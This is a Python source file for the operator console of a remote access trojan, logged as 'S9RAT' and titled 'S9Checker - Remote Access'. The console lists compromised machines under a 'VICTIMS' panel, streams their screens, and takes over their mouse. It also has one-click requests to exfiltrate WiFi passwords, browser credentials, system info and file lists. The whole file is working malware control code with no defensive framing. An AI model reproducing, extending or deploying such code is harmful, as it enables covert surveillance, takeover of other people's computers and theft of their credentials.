
import io
import logging
from typing import Optional

logger = logging.getLogger("S9RAT")

try:
    import customtkinter as ctk
    import tkinter as tk
    from PIL import Image, ImageTk
    HAS_GUI = True
except ImportError:
    HAS_GUI = False


class HackerGUI:

    def __init__(self, server):
        if not HAS_GUI:
            raise ImportError("customtkinter and Pillow required for GUI")
        self.server = server
        self.root = ctk.CTk()
        self.root.title("S9Checker - Remote Access")
        self.root.geometry("1200x800")
        self.root.configure(fg_color="#0f0f0f")
        self.root.minsize(900, 600)

        self.current_client: str | None = None
        self._photo: ImageTk.PhotoImage | None = None
        self._stream_active = False
        self._control_active = False

        self.server.set_callbacks(
            on_client_connect=self._on_client_connect,
            on_client_disconnect=self._on_client_disconnect,
            on_screen_frame=self._on_screen_frame,
            on_exfil_data=self._on_exfil_data,
        )

        self._build_ui()
        self._poll_clients()

    def _build_ui(self):
        main_frame = ctk.CTkFrame(self.root, fg_color="#0f0f0f")
        main_frame.pack(fill="both", expand=True, padx=8, pady=8)

        left_panel = ctk.CTkFrame(main_frame, fg_color="#1a1a1a", width=220)
        left_panel.pack(side="left", fill="y", padx=(0, 8))
        left_panel.pack_propagate(False)

        ctk.CTkLabel(left_panel, text="VICTIMS", font=("Segoe UI", 14, "bold"),
                     text_color="#7c5cff").pack(pady=(12, 8))

        self.client_list = ctk.CTkScrollableFrame(left_panel, fg_color="#1a1a1a")
        self.client_list.pack(fill="both", expand=True, padx=8)

        ctk.CTkButton(left_panel, text="Refresh", command=self._refresh_clients,
                      fg_color="#333333", hover_color="#444444",
                      text_color="#e8e8e8").pack(pady=8, padx=8, fill="x")

        center_panel = ctk.CTkFrame(main_frame, fg_color="#1a1a1a")
        center_panel.pack(side="left", fill="both", expand=True, padx=(0, 8))

        toolbar = ctk.CTkFrame(center_panel, fg_color="#121212", height=40)
        toolbar.pack(fill="x", padx=8, pady=8)

        self.stream_btn = ctk.CTkButton(toolbar, text="Start Stream",
                                         command=self._toggle_stream,
                                         fg_color="#4ade80", hover_color="#22c55e",
                                         text_color="#000000", width=120)
        self.stream_btn.pack(side="left", padx=4)

        self.control_btn = ctk.CTkButton(toolbar, text="Enable Control",
                                          command=self._toggle_control,
                                          fg_color="#fbbf24", hover_color="#f59e0b",
                                          text_color="#000000", width=130)
        self.control_btn.pack(side="left", padx=4)

        self.client_label = ctk.CTkLabel(toolbar, text="No client selected",
                                          font=("Segoe UI", 11), text_color="#888888")
        self.client_label.pack(side="left", padx=12)

        screen_frame = ctk.CTkFrame(center_panel, fg_color="#000000")
        screen_frame.pack(fill="both", expand=True, padx=8, pady=(0, 8))

        self.screen_canvas = tk.Canvas(screen_frame, bg="#000000",
                                        highlightthickness=0)
        self.screen_canvas.pack(fill="both", expand=True)
        self.screen_canvas.bind("<Button-1>", self._on_mouse_click)
        self.screen_canvas.bind("<B1-Motion>", self._on_mouse_drag)
        self.screen_canvas.bind("<ButtonRelease-1>", self._on_mouse_release)
        self.screen_canvas.bind("<Double-Button-1>", self._on_mouse_double)
        self.screen_canvas.bind("<MouseWheel>", self._on_mouse_scroll)
        self.screen_canvas.bind("<Motion>", self._on_mouse_move)

        right_panel = ctk.CTkFrame(main_frame, fg_color="#1a1a1a", width=250)
        right_panel.pack(side="right", fill="y")
        right_panel.pack_propagate(False)

        ctk.CTkLabel(right_panel, text="DATA", font=("Segoe UI", 14, "bold"),
                     text_color="#7c5cff").pack(pady=(12, 8))

        exfil_buttons = [
            ("System Info", "system_info"),
            ("WiFi Passwords", "wifi_passwords"),
            ("Browser Creds", "browser_creds"),
            ("File List", "file_list"),
        ]
        for label, exfil_type in exfil_buttons:
            ctk.CTkButton(right_panel, text=label,
                          command=lambda t=exfil_type: self._request_exfil(t),
                          fg_color="#333333", hover_color="#444444",
                          text_color="#e8e8e8").pack(pady=4, padx=12, fill="x")

        self.exfil_text = ctk.CTkTextbox(right_panel, fg_color="#141414",
                                          text_color="#e8e8e8",
                                          font=("Cascadia Code", 10))
        self.exfil_text.pack(fill="both", expand=True, padx=8, pady=8)

    def _on_client_connect(self, client_id: str, info: dict):
        self.root.after(0, self._add_client_ui, client_id, info)

    def _on_client_disconnect(self, client_id: str):
        self.root.after(0, self._remove_client_ui, client_id)

    def _on_screen_frame(self, client_id: str, frame_data: bytes):
        if client_id != self.current_client:
            return
        try:
            img = Image.open(io.BytesIO(frame_data))
            canvas_w = self.screen_canvas.winfo_width()
            canvas_h = self.screen_canvas.winfo_height()
            if canvas_w > 1 and canvas_h > 1:
                img = img.resize((canvas_w, canvas_h), Image.Resampling.LANCZOS)
            self._photo = ImageTk.PhotoImage(img)
            self.root.after(0, self._update_screen)
        except Exception as e:
            logger.error(f"Screen display error: {e}")

    def _update_screen(self):
        if self._photo:
            self.screen_canvas.delete("all")
            self.screen_canvas.create_image(0, 0, anchor="nw", image=self._photo)

    def _on_exfil_data(self, client_id: str, exfil_type: str, data: dict):
        self.root.after(0, self._show_exfil, exfil_type, data)

    def _add_client_ui(self, client_id: str, info: dict):
        btn = ctk.CTkButton(
            self.client_list, text=f"{info.get('hostname', 'Unknown')}\n{client_id}",
            command=lambda cid=client_id: self._select_client(cid),
            fg_color="#222222", hover_color="#333333",
            text_color="#e8e8e8", height=50,
        )
        btn.pack(fill="x", pady=2)

    def _remove_client_ui(self, client_id: str):
        if client_id == self.current_client:
            self.current_client = None
            self.client_label.configure(text="No client selected")
            self.screen_canvas.delete("all")

    def _select_client(self, client_id: str):
        self.current_client = client_id
        clients = self.server.get_clients()
        info = clients.get(client_id, {})
        self.client_label.configure(
            text=f"{info.get('hostname', '?')} ({client_id})")

    def _refresh_clients(self):
        for widget in self.client_list.winfo_children():
            widget.destroy()
        clients = self.server.get_clients()
        for cid, info in clients.items():
            btn = ctk.CTkButton(
                self.client_list,
                text=f"{info.get('hostname', 'Unknown')}\n{cid}",
                command=lambda c=cid: self._select_client(c),
                fg_color="#222222", hover_color="#333333",
                text_color="#e8e8e8", height=50,
            )
            btn.pack(fill="x", pady=2)

    def _toggle_stream(self):
        if not self.current_client:
            return
        if self._stream_active:
            self.server.stop_screen(self.current_client)
            self._stream_active = False
            self.stream_btn.configure(text="Start Stream", fg_color="#4ade80")
        else:
            self.server.start_screen(self.current_client)
            self._stream_active = True
            self.stream_btn.configure(text="Stop Stream", fg_color="#f87171")

    def _toggle_control(self):
        if not self.current_client:
            return
        if self._control_active:
            self.server.disable_control(self.current_client)
            self._control_active = False
            self.control_btn.configure(text="Enable Control", fg_color="#fbbf24")
        else:
            self.server.enable_control(self.current_client)
            self._control_active = True
            self.control_btn.configure(text="Disable Control", fg_color="#f87171")

    def _request_exfil(self, exfil_type: str):
        if not self.current_client:
            return
        self.server.request_exfil(self.current_client, exfil_type)

    def _show_exfil(self, exfil_type: str, data: dict):
        self.exfil_text.delete("1.0", "end")
        self.exfil_text.insert("end", f"=== {exfil_type.upper()} ===\n\n")
        if isinstance(data, dict):
            for key, value in data.items():
                self.exfil_text.insert("end", f"{key}: {value}\n")
        else:
            self.exfil_text.insert("end", str(data))

    def _get_canvas_coords(self, event) -> tuple[int, int]:
        canvas_w = self.screen_canvas.winfo_width()
        canvas_h = self.screen_canvas.winfo_height()
        if canvas_w <= 1 or canvas_h <= 1:
            return 0, 0
        return event.x, event.y

    def _on_mouse_click(self, event):
        if not self._control_active or not self.current_client:
            return
        x, y = self._get_canvas_coords(event)
        self.server.send_input(self.current_client, "mouse_click", x=x, y=y, button="left")

    def _on_mouse_drag(self, event):
        if not self._control_active or not self.current_client:
            return
        x, y = self._get_canvas_coords(event)
        self.server.send_input(self.current_client, "mouse_move", x=x, y=y)

    def _on_mouse_release(self, event):
        pass

    def _on_mouse_double(self, event):
        if not self._control_active or not self.current_client:
            return
        x, y = self._get_canvas_coords(event)
        self.server.send_input(self.current_client, "mouse_double", x=x, y=y)

    def _on_mouse_scroll(self, event):
        if not self._control_active or not self.current_client:
            return
        amount = -1 if event.delta > 0 else 1
        x, y = self._get_canvas_coords(event)
        self.server.send_input(self.current_client, "mouse_scroll", x=x, y=y, amount=amount)

    def _on_mouse_move(self, event):
        pass

    def _poll_clients(self):
        self._refresh_clients()
        self.root.after(2000, self._poll_clients)

    def run(self):
        self.root.mainloop()

    def stop(self):
        self.server.stop()
        self.root.destroy()
